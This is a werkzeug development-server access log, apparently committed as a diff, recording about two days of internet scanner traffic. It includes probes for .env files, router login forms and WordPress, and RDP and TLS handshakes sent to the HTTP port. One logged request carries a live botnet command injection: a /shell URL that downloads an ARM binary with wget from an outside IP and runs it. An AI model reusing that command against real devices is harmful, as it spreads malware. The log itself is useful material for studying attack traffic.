+INFO:werkzeug:164.90.200.142 - - [21/Apr/2023 19:59:03] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:87.121.221.5 - - [21/Apr/2023 20:02:33] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:14.116.184.240 - - [21/Apr/2023 20:07:57] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [21/Apr/2023 20:13:12] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:128.14.209.162 - - [21/Apr/2023 20:15:04] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:152.32.134.31 - - [21/Apr/2023 20:27:34] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:111.85.200.249 - - [21/Apr/2023 20:47:24] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:61.52.73.94 - - [21/Apr/2023 20:47:43] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:112.115.156.86 - - [21/Apr/2023 20:47:43] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+ERROR:werkzeug:107.170.232.10 - - [21/Apr/2023 20:55:05] code 400, message Bad request syntax ('MGLNDD_46.38.236.126_80')
+INFO:werkzeug:107.170.232.10 - - [21/Apr/2023 20:55:05] "[35m[1mMGLNDD_46.38.236.126_80[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:67.222.131.158 - - [21/Apr/2023 22:22:57] "[33mGET /wp-login.php HTTP/1.1[0m" 404 -
+INFO:werkzeug:179.43.177.243 - - [21/Apr/2023 22:25:15] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+INFO:werkzeug:128.199.0.4 - - [21/Apr/2023 22:26:22] "[33mGET /.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:185.142.236.41 - - [21/Apr/2023 22:44:34] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:185.142.236.41 - - [21/Apr/2023 22:44:35] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+INFO:werkzeug:185.142.236.41 - - [21/Apr/2023 22:44:35] "[33mGET /sitemap.xml HTTP/1.1[0m" 404 -
+INFO:werkzeug:185.142.236.41 - - [21/Apr/2023 22:44:35] "[33mGET /.well-known/security.txt HTTP/1.1[0m" 404 -
+INFO:werkzeug:185.142.236.41 - - [21/Apr/2023 22:44:37] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+ERROR:werkzeug:185.142.236.41 - - [21/Apr/2023 22:44:44] code 400, message Bad request syntax ('\x03µõBd\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
+INFO:werkzeug:185.142.236.41 - - [21/Apr/2023 22:44:44] "[35m[1mµõBd                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            [0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:109.237.97.180 - - [21/Apr/2023 22:46:14] "[33mGET /.env HTTP/1.1[0m" 404 -
+ERROR:werkzeug:109.237.97.180 - - [21/Apr/2023 22:46:14] code 400, message Bad request version ('IÔ\x04Á5\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À\xadÀ$À(À')
+INFO:werkzeug:109.237.97.180 - - [21/Apr/2023 22:46:14] "[35m[1mH D,òÍzÐÉÓ_WDÚÊõO:p¬ES~lèÁtñÙo ZåfoDTeÑõQ+oÌCì¹j4Z+IÔÁ5 bÀ,À0À+À/Ì©Ì¨ £  ¢ ÌªÀ¯À­À$À(À[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:193.32.162.159 - - [21/Apr/2023 23:37:28] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:198.235.24.35 - - [21/Apr/2023 23:42:07] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:37.221.92.199 - - [22/Apr/2023 00:09:19] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:87.236.176.162 - - [22/Apr/2023 00:46:22] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:154.209.125.63 - - [22/Apr/2023 01:03:17] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:154.209.125.92 - - [22/Apr/2023 01:03:17] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:154.209.125.92 - - [22/Apr/2023 01:03:18] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:154.209.125.92 - - [22/Apr/2023 01:03:18] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [22/Apr/2023 01:09:38] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:140.246.136.252 - - [22/Apr/2023 01:21:29] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [22/Apr/2023 02:34:08] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:182.52.246.229 - - [22/Apr/2023 02:37:40] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:128.14.134.170 - - [22/Apr/2023 03:02:00] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:109.237.98.226 - - [22/Apr/2023 03:05:05] "[33mGET /.env HTTP/1.1[0m" 404 -
+ERROR:werkzeug:109.237.98.226 - - [22/Apr/2023 03:05:05] code 400, message Bad request version ('Xkl')
+INFO:werkzeug:109.237.98.226 - - [22/Apr/2023 03:05:05] "[35m[1mH Dð´4º(C+@0ÿë7£[E´Å¡ï¯È iXkl[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:2.189.18.19 - - [22/Apr/2023 03:31:24] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:2.189.18.19 - - [22/Apr/2023 03:31:24] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:152.32.134.31 - - [22/Apr/2023 03:51:32] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:104.152.52.237 - - [22/Apr/2023 04:02:14] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:46.72.148.39 - - [22/Apr/2023 06:04:29] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:91.121.59.189 - - [22/Apr/2023 06:28:59] "[33mGET /.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:91.121.59.189 - - [22/Apr/2023 06:28:59] "[31m[1mPOST / HTTP/1.1[0m" 405 -
+INFO:werkzeug:91.121.59.189 - - [22/Apr/2023 06:28:59] "[33mPOST /core/.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:91.121.59.189 - - [22/Apr/2023 06:28:59] "[33mGET /core/.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:91.121.59.189 - - [22/Apr/2023 06:28:59] "[31m[1mPOST / HTTP/1.1[0m" 405 -
+INFO:werkzeug:91.121.59.189 - - [22/Apr/2023 06:28:59] "[33mPOST /core/.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [22/Apr/2023 06:41:22] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:74.82.47.5 - - [22/Apr/2023 06:53:03] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:74.82.47.5 - - [22/Apr/2023 06:55:12] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:74.82.47.5 - - [22/Apr/2023 06:56:08] "[33mGET /geoserver/web/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.88.66.237 - - [22/Apr/2023 07:24:08] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:185.170.144.3 - - [22/Apr/2023 07:30:06] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+INFO:werkzeug:185.170.144.3 - - [22/Apr/2023 07:30:06] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:193.32.162.159 - - [22/Apr/2023 08:11:28] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:74.215.64.46 - - [22/Apr/2023 08:59:54] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:45.128.232.144 - - [22/Apr/2023 09:07:08] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+INFO:werkzeug:192.241.227.24 - - [22/Apr/2023 10:10:33] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:174.138.61.44 - - [22/Apr/2023 10:15:13] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:174.138.61.44 - - [22/Apr/2023 10:15:23] code 400, message Bad request version ("x64|'|'|No|'|'|S17|'|'|..|'|'|SW5ib3ggLSBPdXRsb29rIERhdGEgRmlsZSAtIE1pY3Jvc29mdCBPdXRsb29rAA==|'|'|")
+INFO:werkzeug:174.138.61.44 - - [22/Apr/2023 10:15:23] "[35m[1m238 ll|'|'|SGFjS2VkX0Q3NUU2QUFB|'|'|WIN-QZN7FJ7D1O|'|'|Administrator|'|'|18-11-28|'|'||'|'|Win 7 Ultimate SP1 x64|'|'|No|'|'|S17|'|'|..|'|'|SW5ib3ggLSBPdXRsb29rIERhdGEgRmlsZSAtIE1pY3Jvc29mdCBPdXRsb29rAA==|'|'|[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:60.191.125.35 - - [22/Apr/2023 10:16:30] "HEAD http://112.124.42.80:63435/ HTTP/1.1" 200 -
+ERROR:werkzeug:94.232.42.99 - - [22/Apr/2023 11:04:07] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+INFO:werkzeug:94.232.42.99 - - [22/Apr/2023 11:04:07] "[35m[1m  ,'à     Cookie: mstshash=Domain[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:94.232.42.99 - - [22/Apr/2023 11:04:07] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+INFO:werkzeug:94.232.42.99 - - [22/Apr/2023 11:04:07] "[35m[1m  ,'à     Cookie: mstshash=Domain[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:94.232.42.99 - - [22/Apr/2023 11:04:07] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+INFO:werkzeug:94.232.42.99 - - [22/Apr/2023 11:04:07] "[35m[1m  ,'à     Cookie: mstshash=Domain[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:193.32.162.159 - - [22/Apr/2023 11:06:37] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:117.214.183.203 - - [22/Apr/2023 11:06:44] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:198.235.24.227 - - [22/Apr/2023 12:02:00] code 400, message Bad request version ('À(À$À\x14À')
+INFO:werkzeug:198.235.24.227 - - [22/Apr/2023 12:02:00] "[35m[1m Ê  Æý¦%¹d£nWÙü*ÙËn+àmig  hÌÌÀ/À+À0À,ÀÀÀ'À#ÀÀ	À(À$ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:193.32.162.159 - - [22/Apr/2023 12:18:33] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:194.55.224.203 - - [22/Apr/2023 12:25:29] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+INFO:werkzeug:162.216.150.240 - - [22/Apr/2023 12:39:37] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:102.129.235.29 - - [22/Apr/2023 13:03:15] "[33mGET /.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:102.129.235.29 - - [22/Apr/2023 13:03:15] "[31m[1mPOST / HTTP/1.1[0m" 405 -
+INFO:werkzeug:179.43.177.243 - - [22/Apr/2023 13:21:23] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:87.121.221.49 - - [22/Apr/2023 14:13:57] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+INFO:werkzeug:47.87.151.189 - - [22/Apr/2023 14:23:00] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [22/Apr/2023 14:48:29] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:34.22.147.120 - - [22/Apr/2023 15:17:18] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:167.94.146.57 - - [22/Apr/2023 15:33:57] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:167.94.146.57 - - [22/Apr/2023 15:33:57] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:167.94.146.57 - - [22/Apr/2023 15:33:57] code 505, message Invalid HTTP version (2.0)
+INFO:werkzeug:167.94.146.57 - - [22/Apr/2023 15:33:57] "[35m[1mPRI * HTTP/2.0[0m" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+INFO:werkzeug:167.94.146.57 - - [22/Apr/2023 15:33:57] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:117.245.164.245 - - [22/Apr/2023 15:41:50] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:117.245.164.245 - - [22/Apr/2023 15:41:50] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [22/Apr/2023 15:53:04] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:176.100.42.20 - - [22/Apr/2023 16:04:56] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+INFO:werkzeug:176.100.42.20 - - [22/Apr/2023 16:04:56] "[35m[1m  ,'à     Cookie: mstshash=Domain[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:176.100.42.20 - - [22/Apr/2023 16:04:56] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+INFO:werkzeug:176.100.42.20 - - [22/Apr/2023 16:04:56] "[35m[1m  ,'à     Cookie: mstshash=Domain[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:176.100.42.20 - - [22/Apr/2023 16:04:56] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+INFO:werkzeug:176.100.42.20 - - [22/Apr/2023 16:04:56] "[35m[1m  ,'à     Cookie: mstshash=Domain[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:179.43.177.243 - - [22/Apr/2023 16:22:28] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+ERROR:werkzeug:37.211.78.173 - - [22/Apr/2023 16:27:51] code 400, message Bad request syntax ('GET /shell?cd+/tmp;+wget+http:/\\/98.159.98.243/AkitaXss/bin.arm;+chmod+777+bin.arm;+./bin.arm Jaws.Selfrep;rm+-rf+bin.arm HTTP/1.1')
+INFO:werkzeug:37.211.78.173 - - [22/Apr/2023 16:27:51] "[35m[1mGET /shell?cd+/tmp;+wget+http:/\/98.159.98.243/AkitaXss/bin.arm;+chmod+777+bin.arm;+./bin.arm Jaws.Selfrep;rm+-rf+bin.arm HTTP/1.1[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:45.79.181.179 - - [22/Apr/2023 16:40:58] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:45.79.181.179 - - [22/Apr/2023 16:40:58] "[35m[1m   º'ûxPH)<Îm¡û¶í²ã#|S×®    À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:167.94.138.50 - - [22/Apr/2023 17:32:47] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:167.94.138.50 - - [22/Apr/2023 17:32:48] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:167.94.138.50 - - [22/Apr/2023 17:32:48] code 505, message Invalid HTTP version (2.0)
+INFO:werkzeug:167.94.138.50 - - [22/Apr/2023 17:32:48] "[35m[1mPRI * HTTP/2.0[0m" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+INFO:werkzeug:167.94.138.50 - - [22/Apr/2023 17:32:48] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:27.43.206.190 - - [22/Apr/2023 17:49:16] "[33mPOST /HNAP1/ HTTP/1.0[0m" 404 -
+INFO:werkzeug:181.129.29.212 - - [22/Apr/2023 18:23:20] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:198.58.114.58 - - [22/Apr/2023 18:33:02] "[33mGET /.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:198.58.114.58 - - [22/Apr/2023 18:33:02] "[31m[1mPOST / HTTP/1.1[0m" 405 -
+INFO:werkzeug:193.32.162.159 - - [22/Apr/2023 18:41:12] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:154.209.125.63 - - [22/Apr/2023 18:52:42] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:154.209.125.92 - - [22/Apr/2023 18:52:42] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:154.209.125.92 - - [22/Apr/2023 18:52:43] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:154.209.125.92 - - [22/Apr/2023 18:52:43] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+INFO:werkzeug:101.68.211.2 - - [22/Apr/2023 19:02:53] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:101.68.211.2 - - [22/Apr/2023 19:05:28] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:101.68.211.2 - - [22/Apr/2023 19:05:29] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:101.68.211.2 - - [22/Apr/2023 19:05:30] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+INFO:werkzeug:44.214.15.144 - - [22/Apr/2023 19:34:49] "[33mGET /.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.83.65.225 - - [22/Apr/2023 19:48:35] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:45.83.66.228 - - [22/Apr/2023 19:48:35] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:3.122.251.14 - - [22/Apr/2023 19:53:15] "[33mGET /.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:14.116.184.240 - - [22/Apr/2023 20:07:57] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:179.43.177.243 - - [22/Apr/2023 20:25:50] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:31.148.125.121 - - [22/Apr/2023 21:13:16] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [22/Apr/2023 21:21:08] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:52.78.43.144 - - [22/Apr/2023 22:26:03] "[33mGET /.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:52.78.43.144 - - [22/Apr/2023 22:26:04] "[31m[1mPOST / HTTP/1.1[0m" 405 -
+INFO:werkzeug:179.43.177.243 - - [22/Apr/2023 22:57:48] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.47.61.24 - - [22/Apr/2023 23:34:23] "[33mGET /.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.47.61.24 - - [22/Apr/2023 23:34:23] "[31m[1mPOST / HTTP/1.1[0m" 405 -
+INFO:werkzeug:193.32.162.159 - - [23/Apr/2023 00:19:51] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.35.18.251 - - [23/Apr/2023 00:24:13] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+INFO:werkzeug:37.221.92.199 - - [23/Apr/2023 00:47:21] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+INFO:werkzeug:15.152.119.150 - - [23/Apr/2023 01:11:41] "[33mGET /.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:162.142.125.225 - - [23/Apr/2023 01:19:13] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:162.142.125.225 - - [23/Apr/2023 01:19:13] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:162.142.125.225 - - [23/Apr/2023 01:19:13] code 505, message Invalid HTTP version (2.0)
+INFO:werkzeug:162.142.125.225 - - [23/Apr/2023 01:19:13] "[35m[1mPRI * HTTP/2.0[0m" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+INFO:werkzeug:162.142.125.225 - - [23/Apr/2023 01:19:14] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:3.91.227.211 - - [23/Apr/2023 01:20:58] "[33mGET /.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:223.240.99.104 - - [23/Apr/2023 01:25:42] "GET / HTTP/1.1" 200 -
